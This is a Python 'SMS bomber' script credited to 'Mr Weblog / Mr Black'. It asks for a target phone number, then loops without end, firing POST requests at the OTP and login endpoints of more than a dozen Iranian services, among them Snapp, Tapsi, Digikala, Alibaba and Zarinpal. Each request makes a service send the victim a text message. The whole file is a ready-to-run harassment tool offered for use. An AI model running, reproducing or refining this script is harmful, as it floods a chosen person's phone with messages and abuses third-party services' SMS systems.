from colorama import Fore
from requests import post , get
from time import sleep
import time
import os
import sys


os.system("clear")

print (Fore.BLUE)
print ("\n[B]\n")
sleep(0.5)
print ("[L]\n")
sleep(0.5)
print ("[A]\n")
sleep(0.5)
print ("[C]\n")
sleep(0.5)
print ("[K]\n")

print (Fore.GREEN)

kop = """ 

                       Mr Weblog Or Mr Black               

"""
for c in kop:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.06)



print (Fore.BLUE+"""                                                                                                    
                                             .                                                      
                                        ;;.  %t........    .;:.                                     
                                       SX:...S%.......... ..;%:.                                    
                                      S8:.:.%%:.;: ..... ...;@@:                                    
                                     %%;:;;%%:.;%:.     .  .XS8t                                    
                                    t8:t;;@%;..t%..      ..;8 :8%.                                  
                                   .8tSt.88   .%t.        X8:;;X8                                   
                                 ..X%@8;%@.   .%;.      ..@X.;::@X:                                 
                                  ;S8@t8@%:   :St..     . 8% . .%@                                  
                                ..@8S888S%..  :@t...    . @88....X:                                 
                               . S%@88S@S;. .;;8:... ..  :S@;8.. @8t                                
                                ;:8X@@8@;;:.8@; ..     X%;S8.t:..@8.                                
                              . 888888X;;:;:%X88@Xtt%8;@::%8tS@::XS.                                
                               .S8:8X88.:%%;;;.S%88XX8;;:.:.t8:.;8%;.                               
                               %@:8t8;.;S@88888@8@888XS%tt%t. X;8SX@;.                              
                             ..8X88.;.%S88X8:88S88;8XX8888XS;:::@88@                                
                              ;St;:  .8:X@XSXt8;8XX8S88.8X@@@;::tS88:                               
                             .S;.    :888Xt88X@@8@8:8888t888%;...X8t                                
                             :S:     :@XX@S@@S88S@8S88S8X8%S8;...@8;                                
                             .t;.    .;8X8.8S.:8X888@88@8@8X;.  .:8t                                
                             ..:..  . :%@@@8S8%8@8@S888S@S8%:.    %S.                               
                              ... ;8  ..%8XS.S@8:SX@8@%8@8%;.    .%;.                               
                              .. .  .. .;S88. 888S888:@@88:.t88X;:..                                
                               . .;:@X:XX;;:S :8t8;%8%8@8t.%@S.t8%.                                 
                             ..:X@%%%8888:8t8@.88X@X88St.;;8 ;%S8X:;;:.                             
                           .:;:t@88@@ .8 X;8@88S@S8@S:;.X8tS88S88::SSt:..                           
                           .;t:tS@8S; :S@8St8;t:;.:t;:.  ;8%StSX@@%%;...                       """)
                           
           
  

print (Fore.CYAN+"SMS BOMBER")


print(Fore.GREEN+"""    __                    __
   / /_  ____  ____ ___  / /_  ___  _____
  / __ \/ __ \/ __ `__ \/ __ \/ _ \/ ___/
 / /_/ / /_/ / / / / / / /_/ /  __/ /
/_.___/\____/_/ /_/ /_/_.___/\___/_/
            """)
print (Fore.BLUE+"""ID Telegram: @Lockeder_Weblog >
                              |__ > ID Rubika: @MSFmetasploit\n""")
print(Fore.YELLOW+"Creator"+" . "+Fore.BLUE+"Lockader"+Fore.WHITE+" = "+Fore.YELLOW+"Mr Weblog"+" . "+Fore.BLUE+""+"Mr Black\n\n"+Fore.WHITE+"W"+Fore.YELLOW+" E"+Fore.BLUE+" B"+Fore.WHITE+" L"+Fore.YELLOW+" O"+Fore.BLUE+" G"+Fore.WHITE+" O"+Fore.YELLOW+" R"+Fore.BLUE+" B"+Fore.WHITE+" L"+Fore.YELLOW+" A"+Fore.BLUE+" C"+Fore.WHITE+" K"+Fore.YELLOW+" T"+Fore.BLUE+" H"+Fore.WHITE+" E"+Fore.YELLOW+" G"+Fore.BLUE+" O"+Fore.WHITE+" D\n\n"+Fore.CYAN+"Mr Weblog or Mr Black")

print (Fore.RED)
number = input ("Phone number target => ")
sleep(1)
print (Fore.RED+"\nattack bomber ",number)
sleep(0.7)
print (Fore.RED+"\tstart\n")
sleep(2)

api0 = {"credential":{"phoneNumber":number,"role":"PASSENGER"}}
api1 = {"cellphone":number}
api2 = {"api_version":number}
api3 = {"api_version":number}
api4 = {"events":number}
api5 = {"cellNumber":number}
api6 = "cellNumber="+number
api7 = {"phone":number}
api8 = {"phoneNumber":number}
api9 = "send=1&cellphone="+number
api10 = {"mobile":number,"country_code":"IR","provider_code":"RUBIKA"}
api11 = {"status":number}
api12 = {"r_value":0.04675983630952381,"is_vpv":number}
api13 = {"username":number}
api14 = {"tagId":number}

#################loading##############
while True:
    hamid0 = post("https://api.tapsi.cab/api/v2/user", json=api0)
    if hamid0.status_code == 200:
        print (Fore.GREEN+"[*]attack ", number)
    else:
        print (Fore.RED+"[-]ERROR")
    hamid = post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", json=api1)

    if hamid.status_code == 200:
        print (Fore.GREEN+"[*]attack ", number)
    else:
        print (Fore.RED+"[-]ERROR")
    hamid1 = post("https://messengerg2c70.iranlms.ir/", json=api2)
    
    if hamid1.status_code == 200:
        print (Fore.GREEN+"[*]attack ", number)
    else:
        print (Fore.RED+"[-]ERROR")
    hamid2 = post("https://shadmessenger60.iranlms.ir/", json=api3)
    
    if hamid2.status_code == 200:
        print (Fore.GREEN+"[*]attack ", number)
    else:
        print (Fore.RED+"[-]ERROR")
    hamid3 = post("https://analytics.metrix.ir/v3/engagement_event", json=api4)
    
    if hamid3.status_code == 200:
        print (Fore.GREEN+"[*]attack ", number)
    else:
        print (Fore.RED+"[-]ERROR")
    hamid4 = post("https://app.mydigipay.com/digipay/api/users/send-sms", json=api5)
    
    if hamid4.status_code == 200:
        print (Fore.GREEN+"[*]attack ", number)
    else:
        print (Fore.RED+"[-]ERROR")
        
    hamid5 = post("https://bama.ir/signin-checkforcellnumber",data=api6)
    
    if hamid5.status_code == 200:
        print (Fore.GREEN+"[*]attack ", number)
    else:
        print (Fore.RED+"[-]ERROR")
        
    hamid6 = post("https://www.digikala.com/ajax/users/login-with-otp/send-confirm-code/", json=api7)
     
    if hamid6.status_code == 200:
        print (Fore.GREEN+"[*]attack ", number)
    else:
        print (Fore.RED+"[-]ERROR")
      
    hamid7 = post("https://ws.alibaba.ir/api/v3/account/mobile/otp", json=api8)
      
    if hamid7.status_code == 200:
        print (Fore.GREEN+"[*]attack ", number)
    else:
         print (Fore.RED+"[-]ERROR")
          
    hamid8 = post("https://web.emtiyaz.app/json/login",data=api9)
      
    if hamid8.status_code == 200:
        print (Fore.GREEN+"[*]attack ", number)
    else:
        print (Fore.RED+"[-]ERROR")
    hamid9 = post("https://api.chartex.net/api/v2/user/validate", json=api10)
    if hamid9.status_code == 200:
         print (Fore.GREEN+"[*]attack ", number)
    else:
         print (Fore.RED+"[-]ERROR")
    hamid10 = post("https://api.zarinplus.com/user/zarinpal-login", json=api11)
    
    if hamid10.status_code == 200:
        print (Fore.GREEN+"[*]attack ", number)
    else:
        print (Fore.RED+"[-]ERROR")
        
    hamid11 = post("https://in.hotjar.com/api/v2/client/sites/2501013/visit-data?sv=7",json=api12)
    if hamid11.status_code == 200:
         print (Fore.GREEN+"[*]attack ",number)
    else:
         print (Fore.RED+"[-]ERROR")
         
    hamid12 = post("https://next.zarinpal.com/api/oauth/initialize", json=api13)
    if hamid12.status_code == 200:
        print (Fore.GREEN+"[*]attack ",number)
    else:
        print (Fore.RED+"[-]ERROR")
        
    hamid13 = post("https://api.mediaad.org/v1/events/tag?fid=7ec75c0a-4b31-4354-bc43-4f92ab49cedc", json=api14)
    if hamid13.status_code == 200:
         print (Fore.GREEN+"[*]attack ", number)
    else:
         print (Fore.RED+"[-]ERROR")
         
     
     
     
      
#THE END